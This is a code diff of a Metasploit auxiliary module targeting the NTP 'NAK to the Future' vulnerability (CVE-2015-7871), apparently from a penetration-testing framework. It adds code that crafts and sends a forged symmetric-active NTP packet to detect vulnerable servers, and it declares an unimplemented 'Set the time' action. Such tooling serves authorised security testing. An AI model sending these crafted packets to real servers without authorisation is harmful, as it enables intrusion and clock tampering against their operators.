@@ -7,8 +7,8 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
   include Msf::Auxiliary::Report
+  include Msf::Auxiliary::Scanner
   include Msf::Exploit::Remote::Udp
-  include Msf::Auxiliary::UDPScanner
   include Msf::Auxiliary::NTP
 
   def initialize(info = {})
@@ -37,7 +37,13 @@ class Metasploit3 < Msf::Auxiliary
             [ 'URL', 'http://www.cisco.com/c/en/us/support/docs/availability/high-availability/19643-ntpm.html' ],
             [ 'URL', 'http://support.ntp.org/bin/view/Main/NtpBug2941' ],
             [ 'CVE', '2015-7871' ]
-          ]
+          ],
+        'Actions'        =>
+          [
+            ['CHECK', { 'Description' => 'Check for NTP NAK to the future' }],
+            ['SET', { 'Description' => 'Set the time' }]
+          ],
+        'DefaultAction'  => 'CHECK'
       )
     )
 
@@ -45,53 +51,63 @@ class Metasploit3 < Msf::Auxiliary
       [
         OptInt.new('OFFSET', [true, "Offset from local time, in seconds", 300])
       ], self.class)
+
+    deregister_options('RHOST')
   end
 
-  def scanner_process(data, shost, _sport)
-    @results[shost] ||= []
-    @results[shost] << data
-  end
-
-  def scan_host(ip)
+  def build_crypto_nak(time)
     probe = Rex::Proto::NTP::NTPSymmetric.new
     probe.stratum = 1
     probe.poll = 10
     probe.mode = 1
-    now = Time.now
-    # compute the timestamp.  NTP stores a timestamp as 64-bit unsigned
-    # integer, the high 32-bits representing the number of seconds since era
-    # epoch and the low 32-bits representing the fraction of a second.  The era
-    # epoch in this case is Jan 1 1900, so we must add the number of seconds
-    # between then and the ruby era epoch, Jan 1 1970, which is 2208988800
-    ts = ((now.to_i + 2208988800 + datastore['OFFSET']) << 32) + now.nsec
+    unless time
+      now = Time.now
+      # compute the timestamp.  NTP stores a timestamp as 64-bit unsigned
+      # integer, the high 32-bits representing the number of seconds since era
+      # epoch and the low 32-bits representing the fraction of a second.  The era
+      # epoch in this case is Jan 1 1900, so we must add the number of seconds
+      # between then and the ruby era epoch, Jan 1 1970, which is 2208988800
+      time = ((now.to_i + 2208988800 + datastore['OFFSET']) << 32) + now.nsec
+    end
+
     # TODO: use different values for each?
-    probe.reference_timestamp = ts
-    probe.origin_timestamp = ts
-    probe.receive_timestamp = ts
-    probe.transmit_timestamp = ts
+    probe.reference_timestamp = time
+    probe.origin_timestamp = time
+    probe.receive_timestamp = time
+    probe.transmit_timestamp = time
     # key-id 0
     probe.payload = "\x00\x00\x00\x00"
-    scanner_send(probe, ip, datastore['RPORT'])
-    # TODO: whatever is next in order to let us win the race against the other peers
+    probe
   end
 
-  def scanner_postscan(batch)
-    @results.keys.map do |host|
-      @results[host].map do |response|
-        ntp_symmetric = Rex::Proto::NTP::NTPSymmetric.new(response)
-        if ntp_symmetric.mode = 2
-          print_good("#{host}:#{rport} - NTP - VULNERABLE: Accepted a NTP symmetric active association")
-          report_vuln(
-            :host  => host,
-            :port  => rport.to_i,
-            :proto => 'udp',
-            :sname => 'ntp',
-            :name  => 'NTP "NAK to the Future"',
-            :info  => "Accepted an NTP symmetric active association by replying with a symmetric passive request",
-            :refs  => self.references
-          )
-        end
+  def check
+    connect_udp
+
+    # pick a random 64-bit timestamp
+    canary_timestamp = rand(2**32..2**64-1)
+    probe = build_crypto_nak(canary_timestamp)
+    udp_sock.puts(probe)
+
+    expected_length = probe.length - probe.payload.length
+    response = udp_sock.timed_read(expected_length)
+    disconnect_udp
+    if response.length == expected_length
+      ntp_symmetric = Rex::Proto::NTP::NTPSymmetric.new(response)
+      if ntp_symmetric.mode == 2 && ntp_symmetric.origin_timestamp == canary_timestamp
+        vprint_good("#{rhost}:#{rport} - NTP - VULNERABLE: Accepted a NTP symmetric active association")
+        report_vuln(
+          host: rhost,
+          port: rport.to_i,
+          proto: 'udp',
+          sname: 'ntp',
+          name: 'NTP "NAK to the Future"',
+          info: 'Accepted an NTP symmetric active association by replying with a symmetric passive request',
+          refs: references
+        )
+        return Exploit::CheckCode::Appears
       end
     end
+
+    return Exploit::CheckCode::Unknown
   end
 end
